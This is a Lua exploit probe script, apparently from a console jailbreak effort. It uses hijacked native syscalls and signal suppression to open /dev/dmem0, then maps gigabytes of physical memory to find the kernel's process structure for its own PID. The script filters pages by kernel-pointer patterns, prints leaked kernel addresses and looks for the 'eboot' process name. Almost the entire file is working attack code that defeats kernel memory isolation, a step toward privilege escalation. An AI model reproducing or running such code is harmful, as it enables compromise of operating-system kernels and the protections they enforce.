-- CRASH_CLASS: LOW
-- PROBE 552o: Two-pass scan: kptr filter + PID search
--
-- Pass 1: Read one qword per 4KB sub-page. If it has kernel pointer
--          bits (0xFFFF8xxx), flag the page.
-- Pass 2: Detailed scan only flagged pages for our PID.
--
-- This is 256x faster than scanning every dword.

print("=== PROBE 552o: Fast two-pass physical memory scan ===")
print("")

local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, N(val)
end
local function fmt(v)
    if v == nil then return "nil" end
    local h, l = get_hi_lo(v)
    if h < 0 then h = h + 0x100000000 end
    if l < 0 then l = l + 0x100000000 end
    return string.format("0x%08X%08X", h, l)
end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) pcall(function() memory.write_qword(a, v) end) end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function rq(a)
    local ok, v = pcall(function() return memory.read_qword(a) end)
    if ok then return v end return nil
end
local function is_kptr(v)
    if not v then return false end
    local h, l = get_hi_lo(v)
    if h < 0 then h = h + 0x100000000 end
    if h < 0xFFFF8000 or h >= 0xFFFFFFFF then return false end
    local exp = math.floor(h / 0x100000) % 0x800
    return exp ~= 0x7FF  -- exclude NaN-boxed
end

local stub = syscall.pipe.fn_addr
local pid = N(native.fcall_with_rax(stub, 20))
print("pid=" .. pid)
local function alive() return N(native.fcall_with_rax(stub, 20)) == pid end

local sa_buf = memory.alloc(0x20)
wq(N(sa_buf), uint64(1))
pcall(function() mk(416)(uint64(12), sa_buf, uint64(0)) end)
pcall(function() mk(416)(uint64(13), sa_buf, uint64(0)) end)

local sc_mmap = mk(477)
local sc_munmap = mk(73)
local sc_open = mk(5)

local devpath = memory.alloc(32)
local path = "/dev/dmem0"
for i = 1, #path do wd(N(devpath) + i - 1, string.byte(path, i)) end
wd(N(devpath) + #path, 0)
local ok_o, fd_raw = pcall(function()
    return sc_open(uint64(N(devpath)), uint64(2), uint64(0))
end)
local dmem_fd = ok_o and N(fd_raw) or -1
if dmem_fd < 0 then print("FAIL: open"); return end

local chunk_size = 0x1000000  -- 16MB
local sub_page = 0x1000       -- 4KB sub-pages for kptr filter
local max_scan = 0x150000000  -- full 5.25 GB pool

-- Multiple probe offsets within each 4KB sub-page to check for kptrs
local kptr_offsets = {0, 8, 16, 24, 32, 40, 48, 56}  -- first 64 bytes

local total_kptr_pages = 0
local total_pid_hits = 0
local proc_candidates = {}

print(string.format("Scanning 0x%X bytes in 0x%X chunks...", max_scan, chunk_size))
print(string.format("  Sub-page size: 0x%X, probes per sub-page: %d", sub_page, #kptr_offsets))
io.flush()

local offset = 0
local chunks = 0

while offset < max_scan do
    if not alive() then break end

    local off_u = uint64(string.format("0x%X", offset))
    local ok_m, map_addr = pcall(function()
        return sc_mmap(uint64(0), uint64(chunk_size), uint64(1),
            uint64(1), uint64(dmem_fd), off_u)
    end)

    if ok_m and N(map_addr) ~= -1 then
        local rh = get_hi_lo(map_addr)
        if rh < 0 then rh = rh + 0x100000000 end
        if rh ~= 0xFFFFFFFF then
            local base = N(map_addr)

            -- Pass 1: Filter sub-pages with kernel pointers
            local flagged = {}
            for sp_off = 0, chunk_size - sub_page, sub_page do
                for _, probe_off in ipairs(kptr_offsets) do
                    local v = rq(base + sp_off + probe_off)
                    if is_kptr(v) then
                        flagged[sp_off] = true
                        total_kptr_pages = total_kptr_pages + 1
                        break
                    end
                end
            end

            -- Pass 2: Scan flagged sub-pages for PID
            for sp_off, _ in pairs(flagged) do
                for d_off = 0, sub_page - 4, 4 do
                    local d = rd(base + sp_off + d_off)
                    if d == pid then
                        local phys = offset + sp_off + d_off
                        total_pid_hits = total_pid_hits + 1
                        print(string.format("  PID at phys 0x%X (chunk %d)", phys, chunks))

                        -- Detailed dump: all kernel pointers in this sub-page
                        local kptrs = {}
                        for ctx = 0, sub_page - 8, 8 do
                            local v = rq(base + sp_off + ctx)
                            if is_kptr(v) then
                                table.insert(kptrs, {off = ctx, val = fmt(v)})
                            end
                        end

                        if #kptrs >= 3 then
                            table.insert(proc_candidates, {
                                phys = phys,
                                pid_off = d_off,
                                kptrs = #kptrs
                            })
                            print(string.format("    *** %d kernel ptrs — PROC CANDIDATE ***",
                                #kptrs))
                            -- Dump context
                            for _, kp in ipairs(kptrs) do
                                if #kptrs <= 20 then
                                    print(string.format("    sub+0x%03X: %s",
                                        kp.off, kp.val))
                                end
                            end
                            -- Check for "eboot" string
                            for nameoff = 0, sub_page - 8, 4 do
                                local nd = rd(base + sp_off + nameoff)
                                if nd == 0x6F6F6265 then  -- "eboo"
                                    local n2 = rd(base + sp_off + nameoff + 4)
                                    if n2 then
                                        local s = ""
                                        for ni = 0, 15 do
                                            local nb = rd(base + sp_off + nameoff + ni)
                                            if nb then
                                                local c = nb % 256
                                                if c == 0 then break end
                                                if c >= 32 and c < 127 then s = s .. string.char(c) end
                                            end
                                        end
                                        print(string.format("    name at sub+0x%X: '%s'", nameoff, s))
                                    end
                                end
                            end
                        end
                    end
                end
            end

            pcall(function() sc_munmap(map_addr, uint64(chunk_size)) end)
        end
    end

    offset = offset + chunk_size
    chunks = chunks + 1
    if chunks % 4 == 0 then
        print(string.format("  ...0x%X scanned (%d kptr pages, %d PIDs)",
            offset, total_kptr_pages, total_pid_hits))
        io.flush()
    end
end

print("")
print("=== SUMMARY ===")
print(string.format("Scanned: 0x%X / 0x%X", offset, max_scan))
print(string.format("Kernel-pointer pages: %d", total_kptr_pages))
print(string.format("PID matches: %d", total_pid_hits))
print(string.format("Proc candidates: %d", #proc_candidates))

for i, pc in ipairs(proc_candidates) do
    print(string.format("  [%d] phys=0x%X pid_off=0x%X kptrs=%d",
        i, pc.phys, pc.pid_off, pc.kptrs))
end

print("")
print("alive=" .. tostring(alive()))
print("DONE")
